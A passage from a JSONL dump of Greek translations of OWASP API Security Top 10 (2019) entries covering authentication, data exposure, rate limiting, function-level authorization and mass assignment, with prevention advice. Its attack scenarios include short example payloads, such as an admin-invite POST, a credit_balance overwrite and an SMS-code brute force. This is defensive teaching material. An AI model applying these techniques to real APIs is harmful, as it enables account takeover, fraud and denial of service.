ή credential stuffing, η εφαρμογή μπορεί να χρησιμοποιηθεί από τους εισβολείς ως ένα μέσο για να προσδιορίσουν εάν τα διαπιστευτήρια είναι έγκυρα. Η τεχνική αυτή μετατρέπει το API σε έναν ελεγκτή (ή μαντείο - oracle) κωδικών πρόσβασης.\n\n## Σενάριο Επίθεσης #2\n\nΈνας εισβολέας ξεκινάει τη διαδικασία ανάκτησης κωδικού πρόσβασης στέλνοντας ένα \nαίτημα HTTP POST στο `/api/system/verification-codes` και παρέχοντας το όνομα χρήστη \nστο σώμα του αιτήματος (request). Στη συνέχεια, αποστέλλεται μέσω SMS ένας κωδικός με 6 ψηφία στο τηλέφωνο του θύματος. Επειδή το API δεν διαθέτει προστασία περιορισμού του ρυθμού των αιτημάτων, ο εισβολέας μπορεί να δοκιμάσει όλους τους πιθανούς συνδυασμούς χρησιμοποιώντας μία πολυνηματική εφαρμογή (multi-threaded script) η οποία στέλνει πολλαπλά αιτήματα στο σημείο προορισμού (URL endpoint) `/api/system/verification-codes/{smsToken}` έως ότου ανακαλύψει τον σωστό 6-ψήφιο κωδικό. Ένα τέτοιο σενάριο επίθεσης μπορεί να ολοκληρωθεί μέσα σε λίγα λεπτά.\n\n## Τρόπος Πρόληψης\n\n* Βεβαιωθείτε ότι γνωρίζετε όλες τις πιθανές ροές εκτέλεσης (execution flows) για έλεγχο ταυτότητας στο API (σύνδεσμοι για κινητά/ιστό/deep links που εφαρμόζουν έλεγχο ταυτότητας με ένα κλικ/κ.λπ.)\n* Επιβεβαιώστε με τους μηχανικούς σας όλες τις ροές εκτέλεσης.\n* Διαβάστε σχετικά με τους μηχανισμούς ελέγχου ταυτότητας. Βεβαιωθείτε ότι καταλαβαίνετε \nτι και πώς χρησιμοποιούνται. Το OAuth δεν είναι έλεγχος ταυτότητας, ούτε και τα κλειδιά API.\n* Μην ανακαλύπτετε ξανά τον τροχό στον έλεγχο ταυτότητας, τη δημιουργία διακριτικών, \nτους τρόπους αποθήκευσης κωδικών πρόσβασης. Χρησιμοποιήστε τις καθιερωμένες προδιαγραφές (standards).\n* Τα τελικά σημεία ανάκτησης διαπιστευτηρίων/λήψης κωδικού πρόσβασης θα πρέπει να αντιμετωπίζονται \nως τελικά σημεία σύνδεσης. Εφαρμόστε τα ίδια συστήματα ασφαλείας κατά επιθέσεων όπως την ωμή βία (brute force), τον περιορισμό του ρυθμού (rate limiting) και τις προστασίες κλειδώματος.\n* Συμβουλευτείτε και χρησιμοποιήστε το [OWASP Authentication Cheatsheet][3].\n* Όπου είναι δυνατόν, εφαρμόστε έλεγχο ταυτότητας πολλαπλών παραγόντων (multi-factor authentication).\n* Εφαρμόστε μηχανισμούς κατά της ωμής βίας για τον μετριασμό του credential stuffing, της επίθεσης \nλεξικού και των επιθέσεων ωμής βίας στα τελικά σημεία ελέγχου ταυτότητας. Αυτός ο μηχανισμός θα πρέπει \nνα είναι πιο αυστηρός από τον κανονικό μηχανισμό περιορισμού ρυθμών στο API σας.\n* Εφαρμόστε το μηχανισμό [account lockout][4] / captcha για να αποτρέψετε την ωμή βία εναντίον συγκεκριμένων \nχρηστών. Εφαρμόστε ελέγχους αδύναμου κωδικού πρόσβασης.\n* Τα κλειδιά API δεν πρέπει να χρησιμοποιούνται για έλεγχο ταυτότητας χρήστη, αλλά για [client app/project authentication][5].\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Key Management Cheat Sheet][6]\n* [OWASP Authentication Cheatsheet][3]\n* [Credential Stuffing][1]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-798: Use of Hard-coded Credentials][7]\n\n[1]: https://www.owasp.org/index.php/Credential_stuffing\n[2]: https://github.com/danielmiessler/SecLists\n[3]: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html\n[4]: https://www.owasp.org/index.php/Testing_for_Weak_lock_out_mechanism_(OTG-AUTHN-003)\n[5]: https://cloud.google.com/endpoints/docs/openapi/when-why-api-key\n[6]: https://www.owasp.org/index.php/Key_Management_Cheat_Sheet\n[7]: https://cwe.mitre.org/data/definitions/798.html\n", "timestamp": "2025-10-24T22:26:23.007362"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa3-excessive-data-exposure.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa3-excessive-data-exposure.md", "content": "# API3:2019 Excessive Data Exposure\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **2** : Ανιχνευσιμότητα **2** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Η εκμετάλλευση (exploitation) της υπερβολικής έκθεσης δεδομένων (Excessive Data Exposure) είναι απλή και συνήθως πραγματοποιείται ανιχνεύοντας και αναλύοντας την κίνηση των δεδομένων που επιστρέφονται από το API στον χρήστη. Στόχος της ανάλυσης των δεδομένων είναι η αναζήτηση πιθανής έκθεσης σε ευαίσθητα δεδομένα που δεν πρέπει να επιστραφούν στον χρήστη. | Το κενό ασφαλείας εμφανίζεται όταν APIs βασίζονται στις εφαρμογές-πελάτες (client) για την εκτέλεση του φιλτραρίσματος δεδομένων. Δεδομένου ότι τα APIs χρησιμοποιούνται ως πηγές δεδομένων, συχνά οι προγραμματιστές προσπαθούν να τα υλοποιήσουν με γενικό τρόπο χωρίς να σκεφτούν την ευαισθησία των δεδομένων που εκτίθενται. Τα αυτόματα εργαλεία συνήθως δεν μπορούν να εντοπίσουν αυτόν τον τύπο ευπάθειας, επειδή είναι δύσκολο να γίνει διάκριση μεταξύ των μη-ευαίσθητων δεδομένων που επιστρέφονται από το API και των ευαίσθητων δεδομένων που δεν πρέπει να επιστραφούν. Η δυσκολία αυτή προκύπτει επειδή τα αυτόματα εργαλεία δεν κατανοούν σε βάθος την εφαρμογή. | Η υπερβολική έκθεση δεδομένων οδηγεί συνήθως σε έκθεση ευαίσθητων δεδομένων. |\n\n## Πότε το API είναι ευάλωτο\n\nΤο API επιστρέφει ευαίσθητα δεδομένα στην εφαρμογή-πελάτη (client) βάσει σχεδίασης. Αυτά τα δεδομένα συνήθως φιλτράρονται από την πλευρά της εφαρμογής-πελάτη πριν παρουσιαστούν στον χρήστη. Ένας εισβολέας μπορεί εύκολα να δει τα ευαίσθητα δεδομένα ανιχνεύοντας την κίνηση.\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΗ ομάδα που ασχολείται με το development για κινητά χρησιμοποιεί το τελικό σημείο προορισμού\n`/api/articles/{articleId}/comments/{commentId}` στην σελίδα προβολής άρθρων για την εμφάνιση \nτων μεταδεδομένων των σχολίων. Ανιχνεύοντας την κίνηση της εφαρμογής για κινητά, ένας εισβολέας \nανακαλύπτει ότι επιστρέφονται και άλλα ευαίσθητα δεδομένα που σχετίζονται \nμε τον συντάκτη του σχολίου. Η υλοποίηση τελικού σημείου προορισμού (endpoint), χρησιμοποιεί μια \nγενική μέθοδο `toJSON()` για τη σειριοποίηση (serialization) του αντικειμένου στο μοντέλο `User`, \nτο οποίο περιέχει ευαίσθητα δεδομένα (PII).\n\n### Σενάριο Επίθεσης #2\n\nΈνα σύστημα επιτήρησης που βασίζεται στο IOT επιτρέπει στους διαχειριστές να δημιουργούν χρήστες με διαφορετικά δικαιώματα. Ένας διαχειριστής δημιούργησε έναν λογαριασμό χρήστη για έναν νέο φύλακα που θα πρέπει να έχει πρόσβαση μόνο σε συγκεκριμένα κτίρια στον ιστότοπο. Μόλις ο φύλακας χρησιμοποιήσει την εφαρμογή του για κινητά, ενεργοποιείται μια κλήση API στη διεύθυνση: `/api/sites/111/cameras` προκειμένου να ληφθούν δεδομένα σχετικά με τις διαθέσιμες κάμερες και να εμφανίστουν στον πίνακα ελέγχου. Η απάντηση περιέχει μια λίστα με λεπτομέρειες σχετικά με τις κάμερες στην ακόλουθη μορφή: `{\"id\":\"xxx\",\"live_access_token\":\"xxxx-bbbbb\",\"building_id\":\"yyy\"}`. Ενώ το GUI της εφαρμογής-πελάτη εμφανίζει μόνο κάμερες στις οποίες θα πρέπει να έχει πρόσβαση ο φύλακας, η πραγματική απόκριση API περιέχει μια πλήρη λίστα με όλες τις κάμερες στον ιστότοπο.\n\n## Τρόπος Πρόληψης\n\n* Μην βασίζεστε ποτέ στην πλευρά της εφαρμογής-πελάτη για να φιλτράρετε ευαίσθητα δεδομένα.\n* Ελέγξτε τις απαντήσεις από το API για να βεβαιωθείτε ότι περιέχουν μόνο αποδεκτά δεδομένα.\n* Οι back-end προγραμματιστές θα πρέπει πάντα να διερωτόνται \"ποιος είναι ο καταναλωτής των δεδομένων;\", \n πριν εκθέσουν δημόσια ένα νέο τελικό σημείο προορισμού API.\n* Αποφύγετε τη χρήση γενικών μεθόδων όπως `to_json()` και `to_string()`. \nΑντίθετα, επιλέξτε συγκεκριμένα πεδία που θέλετε πραγματικά να επιστρέψετε.\n* Ταξινομήστε όλες τις ευαίσθητες και προσωπικά αναγνωρίσιμες πληροφορίες (PII) \nτις οποίες αποθηκεύει και συνεργάζεται η εφαρμογή σας, ελέγχοντας όλες τις κλήσεις \nAPI που επιστρέφουν τέτοιες πληροφορίες για να δείτε εάν αυτές οι απαντήσεις \nδημιουργούν πρόβλημα ασφαλείας.\n* Εφαρμόστε έναν μηχανισμό επικύρωσης απόκρισης που βασίζεται σε σχήματα (schema-based)\nως ένα επιπλέον επίπεδο ασφαλείας. Ως μέρος αυτού του μηχανισμού ορίστε και επιβάλλετε \nδεδομένα που επιστρέφονται από όλες τις μεθόδους API, συμπεριλαμβανομένων των σφαλμάτων.\n\n\n## Αναφορές (References)\n\n### Εξωτερικές Αναφορές\n\n* [CWE-213: Intentional Information Exposure][1]\n\n[1]: https://cwe.mitre.org/data/definitions/213.html\n", "timestamp": "2025-10-24T22:26:23.111576"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa4-lack-of-resources-and-rate-limiting.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa4-lack-of-resources-and-rate-limiting.md", "content": "# API4:2019 Lack of Resources & Rate Limiting\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **2** | Επικράτηση (Prevalence) **3** : Ανιχνευσιμότητα **3** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Η εκμετάλλευση (exploitation) αυτής της αδυναμίας ασφαλείας απαιτεί μόνο την αποστολή απλών αιτημάτων (requests) στο API. Δεν απαιτείται έλεγχος ταυτότητας. Πολλαπλά ταυτόχρονα αιτήματα (requests) μπορούν να αποσταλούν από έναν μόνο τοπικό υπολογιστή ή χρησιμοποιώντας πόρους υπολογιστικού νέφους (cloud computing). | Είναι σύνηθες να βρίσκουμε API που δεν εφαρμόζουν περιορισμό ρυθμού (rate limiting) ή APIs όπου τα όρια περιορισμού δεν έχουν οριστεί σωστά. | Η εκμετάλλευση (exploitation) μπορεί να οδηγήσει σε επιθέσεις άρνησης υπηρεσιών (DoS), καθιστώντας το API μη ανταποκρινόμενο ή ακόμη και μη διαθέσιμο. |\n\n## Πότε το API είναι ευάλωτο\n\nΤα αιτήματα (requests) API καταναλώνουν πόρους (resources) όπως πόρους δικτύου, επεξεργαστή (CPU), μνήμης και αποθήκευσης. Το ποσό των πόρων που απαιτούνται για την ολοκλήρωση ενός αιτήματος εξαρτάται σε μεγάλο βαθμό από τα δεδομένα εισόδου του χρήστη και την επιχειρηματική λογική (business logic) του τελικού σημείου προορισμού (endpoint). Επίσης, λάβετε υπόψη το γεγονός ότι τα αιτήματα από πολλαπλούς πελάτες API ανταγωνίζονται για τους πόρους του συστήματος. Ένα API είναι ευάλωτο εάν τουλάχιστον ένα από τα ακόλουθα όρια περιορισμού λείπει ή τα όρια περιορισμού δεν έχουν οριστεί καταλλήλως (π.χ. πολύ χαμηλά/υψηλά):\n\n* Χρονικά όρια εκτέλεσης (execution timeouts)\n* Μέγιστο ποσό δέσμευσης μνήμης\n* Αριθμός περιγραφέων αρχείου (file descriptors)\n* Αριθμός διεργασιών (processes)\n* Μέγεθος αιτήματος ωφέλιμου φορτίου (request payload size) (π.χ. μεταφορτώσεις (uploads)) \n* Αριθμός αιτημάτων ανά πρόγραμμα-πελάτη/πόρο συστήματος\n* Αριθμός εγγραφών ανά σελίδα που περιέχονται σε κάθε απάντηση αιτήματος (request response)\n\n## Παραδείγματα από Σενάρια Επίθεσης\n\n### Σενάριο #1\n\nΈνας εισβολέας ανεβάζει μια μεγάλη εικόνα υποβάλλοντας ένα αίτημα POST στο `/api/v1/images`.\nΌταν ολοκληρωθεί η μεταφόρτωση, το API δημιουργεί πολλές μικρογραφίες (thumbnails) με διαφορετικά μεγέθη.\nΛόγω του μεγάλου μεγέθους της μεταφορτωμένης εικόνας, η διαθέσιμη μνήμη του συστήματος εξαντλείται κατά τη δημιουργία μικρογραφιών και το API σταματάει να ανταποκρίνεται.\n\n### Σενάριο #2\n\nΈχουμε μια εφαρμογή που περιέχει τη λίστα χρηστών σε μια διεπαφή χρήστη (UI) με όριο \n200 χρήστες ανά σελίδα. Η λίστα των χρηστών ανακτάται από τον διακομιστή (server) χρησιμοποιώντας \nτο ακόλουθο ερώτημα: `/api/users?page=1&size=200`. Ένας εισβολέας αλλάζει την παράμετρο \nμεγέθους σε `200 000`, προκαλώντας προβλήματα απόδοσης (performance) στη βάση δεδομένων. \nΤα προβλήματα απόδοσης της βάσης δεδομένων σταματούν το API από το να ανταποκρίνεται και\nτο API δεν είναι πλέον σε θέση να χειριστεί περαιτέρω αιτήματα από τον τρέχων ή άλλους πελάτες (γνωστό και ως DoS).\n\nΤο ίδιο σενάριο μπορεί να χρησιμοποιηθεί για την πρόκληση σφαλμάτων υπερχείλισης ακεραίων (Integer Overflow) ή υπερχείλισης buffer (Buffer Overflow).\n\n## Τρόπος Πρόληψης\n\n* Το Docker διευκολύνει τον περιορισμό της [μνήμης][1], του [επεξεργαστή CPU][2], τον [αριθμό επανεκκινήσεων][3],\n  των [περιγραφέων αρχείου (file descriptors), και διεργασιών (processes)][4].\n* Εφαρμόστε ένα όριο περιορισμού σχετικά με το πόσο συχνά ένα πρόγραμμα-πελάτης μπορεί να καλεί το API εντός ενός καθορισμένου χρονικού πλαισίου.\n* Ειδοποιήστε το πρόγραμμα-πελάτη όταν γίνεται υπέρβαση του ορίου παρέχοντας τον αριθμό ορίου και την ώρα κατά την οποία θα γίνει επαναφορά του ορίου.\n* Προσθέστε την κατάλληλη επικύρωση (validation) από την πλευρά του διακομιστή για τις παραμέτρους συμβολοσειράς ερωτήματος (query string) και σώματος αιτήματος (request body), ειδικά αυτή που ελέγχει τον αριθμό των εγγραφών που θα επιστραφούν στην απάντηση.\n* Καθορίστε και επιβάλλετε μέγιστο μέγεθος δεδομένων σε όλες τις εισερχόμενες παραμέτρους και ωφέλιμα φορτία (payloads), \nόπως το μέγιστο μήκος για τις συμβολοσειρές (strings) και τον μέγιστο αριθμό στοιχείων σε πίνακες (elements in arrays).\n\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [Blocking Brute Force Attacks][5]\n* [Docker Cheat Sheet - Limit resources (memory, CPU, file descriptors,\n  processes, restarts)][6]\n* [REST Assessment Cheat Sheet][7]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-307: Improper Restriction of Excessive Authentication Attempts][8]\n* [CWE-770: Allocation of Resources Without Limits or Throttling][9]\n* “_Rate Limiting (Throttling)_” - [Security Strategies for Microservices-based\n  Application Systems][10], NIST\n\n[1]: https://docs.docker.com/config/containers/resource_constraints/#memory\n[2]: https://docs.docker.com/config/containers/resource_constraints/#cpu\n[3]: https://docs.docker.com/engine/reference/commandline/run/#restart-policies---restart\n[4]: https://docs.docker.com/engine/reference/commandline/run/#set-ulimits-in-container---ulimit\n[5]: https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks\n[6]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/Docker_Security_Cheat_Sheet.md#rule-7---limit-resources-memory-cpu-file-descriptors-processes-restarts\n[7]: https://github.com/OWASP/CheatSheetSeries/blob/3a8134d792528a775142471b1cb14433b4fda3fb/cheatsheets/REST_Assessment_Cheat_Sheet.md\n[8]: https://cwe.mitre.org/data/definitions/307.html\n[9]: https://cwe.mitre.org/data/definitions/770.html\n[10]: https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204-draft.pdf\n", "timestamp": "2025-10-24T22:26:23.223365"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa5-broken-function-level-authorization.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa5-broken-function-level-authorization.md", "content": "# API5:2019 Broken Function Level Authorization\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **3** | Επικράτηση (Prevalence) **2** : Ανιχνευσιμότητα **1** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Η εκμετάλλευση (exploitation) αυτής της αδυναμίας ασφαλείας απαιτεί από τον εισβολέα (attacker) να στείλει έγκυρες κλήσεις σε τελικό σημείο προορισμού API (endpoint) στο οποίο κανονικά δεν θα πρέπει να έχει πρόσβαση. Αυτά τα τελικά σημεία προορισμού ενδέχεται να εκτίθενται σε ανώνυμους χρήστες ή/και σε κανονικούς, μη προνομιούχους/εξουσιοδοτημένους χρήστες (non-privileged users). Είναι εύκολο να ανακαλύψετε τέτοιου είδους ελαττώματα σε APIs καθώς τα APIs έχουν δομή και ο τρόπος πρόσβασης σε ορισμένες λειτουργίες είναι εύκολα προβλέψιμος (π.χ. αντικατάσταση της μεθόδου HTTP από GET σε PUT ή αλλαγή της συμβολοσειράς \"users\" στη διεύθυνση URL σε \"admins\" ). | Οι έλεγχοι εξουσιοδότησης (authorization checks) για μια λειτουργία (function) ή έναν πόρο συστήματος (resource) βασίζονται συνήθως σε ρυθμίσεις (configuration) και μερικές φορές υλοποιούνται σε επίπεδο κώδικα. Η εφαρμογή των κατάλληλων και σωστών ελέγχων εξουσιοδότησης είναι συνήθως μια περίπλοκη εργασία, καθώς οι σύγχρονες εφαρμογές ενδέχεται να περιέχουν πολλούς τύπους ρόλων ή ομάδων και πολύπλοκη ιεραρχία χρηστών (π.χ. υπο-χρήστες, χρήστες με περισσότερους από έναν ρόλους). | Οι αδυναμίες ασφαλείας αυτές επιτρέπουν στους εισβολείς να έχουν πρόσβαση σε μη εξουσιοδοτημένες λειτουργίες. Οι διαχειριστικές λειτουργίες (administrative functions) είναι οι βασικοί στόχοι για αυτό το είδος επίθεσης. |\n\n## Πότε το API είναι ευάλωτο\n\nΟ καλύτερος τρόπος για να βρείτε αδυναμίες ασφαλείας εξουσιοδότησης σε επίπεδο λειτουργιών (Broken Function Level Authorization) είναι να πραγματοποιήσετε μια ενδελεχή ανάλυση (deep analysis) του μηχανισμού εξουσιοδότησης (authorization mechanism). Λάβετε υπόψιν σας την ιεραρχία των χρηστών, τους διαφορετικούς ρόλους ή/και τις ομάδες του συστήματος χρησιμοποιώντας τις ακόλουθες ερωτήσεις:\n\n* Μπορεί ένας κανονικός χρήστης να έχει πρόσβαση στα τελικά σημεία διαχείρισης (administrative endpoints);\n* Μπορεί ένας χρήστης να εκτελέσει ευαίσθητες ενέργειες (π.χ. δημιουργία, τροποποίηση ή διαγραφή) στις οποίες δεν θα έπρεπε να έχει πρόσβαση αλλάζοντας απλώς τη μέθοδο HTTP (π.χ. από \"GET\" σε \"DELETE\");\n* Μπορεί ένας χρήστης από την ομάδα Χ να αποκτήσει πρόσβαση σε μια λειτουργία που θα πρέπει να εκτίθεται μόνο σε χρήστες από την ομάδα Υ, μαντεύοντας απλώς τη διεύθυνση URL του τελικού σημείου προορισμού και τις παραμέτρους (π.χ. `/api/v1/users/export_all`);\n\nΜην υποθέτετε ότι ένα τελικό σημείο API είναι κανονικό ή διαχειριστικό μόνο με βάση τη διαδρομή URL.\n\nΠαρόλο που οι προγραμματιστές ενδέχεται να επιλέξουν να εκθέσουν τα περισσότερα από τα διαχειριστικά τελικά σημεία προορισμού σε μια συγκεκριμένη σχετική διαδρομή, όπως `api/admins`, είναι πολύ συνηθισμένο να βρίσκουμε αυτά τα τελικά σημεία διαχείρισης και σε άλλες σχετικές διαδρομές μαζί με κανονικά τελικά σημεία προορισμού, όπως `api/users`.\n\n## Παραδείγματα Σεναρίων Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΚατά τη διαδικασία εγγραφής σε μια εφαρμογή που επιτρέπει τη συμμετοχή μόνο σε \nπροσκεκλημένους χρήστες, η εφαρμογή για κινητά εκτελεί μια κλήση API στο \n`GET /api/invites/{invite_guid}`. Η απάντηση περιέχει ένα JSON με λεπτομέρειες \nσχετικές με την πρόσκληση, συμπεριλαμβανομένου του ρόλου του χρήστη και του email του χρήστη.\n\nΈνας εισβολέας αντέγραψε το αίτημα και άλλαξε τη μέθοδο HTTP και το τελικό \nσημείο σε `POST /api/invites/new`. Αυτό το τελικό σημείο προορισμού θα πρέπει να είναι προσβάσιμο μόνο \nαπό διαχειριστές που χρησιμοποιούν την κονσόλα διαχείρισης, το οποίο όμως τελικό σημείο προορισμού δεν εφαρμόζει ελέγχους \nεξουσιοδότησης σε επίπεδο λειτουργίας.\n\nΟ εισβολέας εκμεταλλεύεται το πρόβλημα και στέλνει στον εαυτό του μια πρόσκληση για να δημιουργήσει έναν λογαριασμό διαχειριστή:\n\n```\nPOST /api/invites/new\n\n{“email”:”hugo@malicious.com”,”role”:”admin”}\n```\n\n### Σενάριο Επίθεσης #2\n\nΈνα API περιέχει ένα τελικό σημείο προορισμού (endpoint) που θα πρέπει να είναι προσβάσιμο μόνο στους διαχειριστές - \n`GET /api/admin/v1/users/all`. Αυτό το τελικό σημείο προορισμού επιστρέφει τα στοιχεία όλων των χρηστών της \nεφαρμογής και δεν εφαρμόζει ελέγχους εξουσιοδότησης σε επίπεδο λειτουργίας. Ένας εισβολέας που \nέμαθε τη δομή του API κάνει μια πιθανή εικασία και καταφέρνει να αποκτήσει πρόσβαση σε αυτό \nτο τελικό σημείο προορισμού, το οποίο εκθέτει ευαίσθητες λεπτομέρειες των χρηστών της εφαρμογής.\n\n\n\n## Τρόπος Πρόληψης\n\nΗ εφαρμογή σας θα πρέπει να διαθέτει ένα σταθερό και εύκολο στην ανάλυση υποσύστημα εξουσιοδότησης (authorization module) το οποίο θα χρησιμοποιείται από όλες τις επιχειρησιακές λειτουργίες (business functions). \n\nΣυχνά, μια τέτοια προστασία παρέχεται από ένα ή περισσότερα υποσυστήματα (components) που βρίσκονται εκτός του κώδικα της εφαρμογής.\n\n* Οι μηχανισμοί επιβολής θα πρέπει από προεπιλογή (by default) να απαγορεύουν κάθε πρόσβαση, απαιτώντας ρητές εξουσιοδοτήσεις (explicit grants) σε συγκεκριμένους ρόλους για πρόσβαση σε κάθε λειτουργία.\n* Ελέγξτε τα τελικά σημεία προορισμού του API σας σε σχέση με τις αδυναμίες ασφαλείας εξουσιοδότησης σε επίπεδο λειτουργίας (function level), λαμβάνοντας παράλληλα υπόψη την επιχειρησιακή λογική (business logic) της εφαρμογής και της ιεραρχίας των ομάδων χρηστών.\n* Βεβαιωθείτε ότι όλα τα διαχειριστικά υποσυστήματα (controllers) βασίζουν την λειτουργία τους σε ένα γενικό διαχειριστικό υποσύστημα (abstract controller) που εφαρμόζει ελέγχους εξουσιοδότησης βάσει της ομάδας και του ρόλου του χρήστη.\n* Βεβαιωθείτε ότι οι λειτουργίες διαχείρισης μέσα σε ένα κανονικό διαχειριστικό υποσύστημα (controller) εφαρμόζουν ελέγχους εξουσιοδότησης βάσει της ομάδας και του ρόλου του χρήστη.\n\n## Αναφορές (References)\n\n### Αναφορές OWASP\n\n* [OWASP Article on Forced Browsing][1]\n* [OWASP Top 10 2013-A7-Missing Function Level Access Control][2]\n* [OWASP Development Guide: Chapter on Authorization][3]\n\n### Εξωτερικές Αναφορές\n\n* [CWE-285: Improper Authorization][4]\n\n[1]: https://www.owasp.org/index.php/Forced_browsing\n[2]: https://www.owasp.org/index.php/Top_10_2013-A7-Missing_Function_Level_Access_Control\n[3]: https://www.owasp.org/index.php/Category:Access_Control\n[4]: https://cwe.mitre.org/data/definitions/285.html\n", "timestamp": "2025-10-24T22:26:23.342523"}
{"source": "github", "repo": "OWASP/API-Security", "file": "editions/2019/el-gr/0xa6-mass-assignment.md", "url": "https://github.com/OWASP/API-Security/blob/master/editions/2019/el-gr/0xa6-mass-assignment.md", "content": "# API6:2019 Mass Assignment\n\n| Παράγοντες Απειλής (Threat agents) / Φορείς Επίθεσης (Attack vectors) | Αδυναμία Ασφαλείας (Security Weakness) | Επιπτώσεις (Impacts) |\n| - | - | - |\n| Εξαρτώνται από το API : Εκμεταλλευσιμότητα **2** | Επικράτηση (Prevalence) **2** : Ανιχνευσιμότητα **2** | Τεχνικές Επιπτώσεις **2** : Εξαρτώνται από την Επιχείρηση |\n| Η εκμετάλλευση (exploitation) αυτής της αδυναμίας ασφαλείας συνήθως απαιτεί κατανόηση της επιχειρησιακής λογικής (business logic), των σχέσεων των αντικειμένων και της δομής του API.  Η εκμετάλλευση της μαζικής εκχώρησης (Mass Assignment) είναι ευκολότερη στα APIs, καθώς από το σχεδιασμό τους εκθέτουν την υλοποίηση της εφαρμογής μαζί με τα ονόματα των ιδιοτήτων (properties). | Τα σύγχρονα frameworks ενθαρρύνουν τους προγραμματιστές να χρησιμοποιούν συναρτήσεις (functions) που συνδέουν αυτόματα την είσοδο από τον χρήστη ή την εφαρμογή-πελάτη (client) σε μεταβλητές κώδικα και εσωτερικά αντικείμενα. Οι εισβολείς μπορούν να χρησιμοποιήσουν αυτήν τη μεθοδολογία για να ενημερώσουν ή να αντικαταστήσουν τις τιμές ευαίσθητων ιδιοτήτων αντικειμένων (object properties), τις οποίες οι προγραμματιστές δεν σκόπευαν ποτέ να εκθέσουν στους χρήστες. | Η εκμετάλλευση (exploitation) μπορεί να οδηγήσει σε κλιμάκωση των προνομίων (privilege escalation), παραποίηση δεδομένων (data tampering), παράκαμψη μηχανισμών ασφαλείας και πολλά άλλα. |\n\n## Πότε το API είναι ευάλωτο\n\nΤα αντικείμενα (objects) στις σύγχρονες εφαρμογές μπορεί να περιέχουν πολλές ιδιότητες (properties). \nΟρισμένες από αυτές τις ιδιότητες θα πρέπει να μπορούν να ενημερώνονται απευθείας από την εφαρμογή-πελάτη (client) (π.χ. `user.first_name` ή `user.address`) και ορισμένες από αυτές δεν θα πρέπει να είναι προσβάσιμες στους χρήστες / εφαρμογές-πελάτες (π.χ. `user.is_vip`).\n\nΈνα τελικό σημείο προορισμού API είναι ευάλωτο εάν μετατρέπει αυτόματα τις παραμέτρους της εφαρμογής-πελάτη σε ιδιότητες εσωτερικού αντικειμένου, χωρίς να λαμβάνεται υπόψη η ευαισθησία και το επίπεδο έκθεσης αυτών των ιδιοτήτων. Αυτό θα μπορούσε να επιτρέψει σε έναν εισβολέα να ενημερώσει τις ιδιότητες αντικειμένων (object properties), στις οποίες δεν θα έπρεπε να έχει πρόσβαση.\n\nΠαραδείγματα ευαίσθητων ιδιοτήτων (properties):\n\n* **Ιδιότητες που σχετίζονται με δικαιώματα**: Τα `user.is_admin`, `user.is_vip` θα πρέπει να ορίζονται μόνο από διαχειριστές.\n* **Ιδιότητες που εξαρτώνται από κάποια διαδικασία (process)**: Το `user.cash` θα πρέπει να ορίζεται εσωτερικά μόνο μετά την επαλήθευση πληρωμής.\n* **Εσωτερικές ιδιότητες**: Η ιδιότητα `article.created_time` θα πρέπει να επιτρέπεται να ορίζεται μόνο εσωτερικά από την εφαρμογή.\n\n## Παραδείγματα Σεναρίων Επίθεσης\n\n### Σενάριο Επίθεσης #1\n\nΜια εφαρμογή διαμοιρασμού διαδρομής (ride sharing) παρέχει στον χρήστη την επιλογή να επεξεργαστεί βασικές πληροφορίες για το προφίλ του. \nΚατά τη διάρκεια αυτής της διαδικασίας, αποστέλλεται μια κλήση API στο\n`PUT /api/v1/users/me` με το ακόλουθο έγκυρο αντικείμενο JSON:\n\n```json\n{\"user_name\":\"inons\",\"age\":24}\n```\n\nΤο αίτημα `GET /api/v1/users/me` περιλαμβάνει μια πρόσθετη ιδιότητα credit_balance:\n\n```json\n{\"user_name\":\"inons\",\"age\":24,\"credit_balance\":10}\n```\n\nΟ εισβολέας επαναλαμβάνει το πρώτο αίτημα με το ακόλουθο payload:\n```json\n{\"user_name\":\"attacker\",\"age\":60,\"credit_balance\":99999}\n```\n\nΔεδομένου ότι το τελικό σημείο προορισμού είναι ευάλωτο σε μαζική εκχώρηση (Mass Assignment), ο εισβολέας λαμβάνει πιστώσεις (credits) χωρίς να πληρώσει.\n\n### Σενάριο Επίθεσης #2\n\nΈνα portal διαμοιρασμού βίντεο (video sharing portal) επιτρέπει στους χρήστες να ανεβάζουν περιεχόμενο και να κατεβάζουν περιεχόμενο σε διαφορετικές μορφές (formats). Ένας εισβολέας που εξερευνά το API διαπίστωσε ότι το τελικό σημείο προορισμού `GET 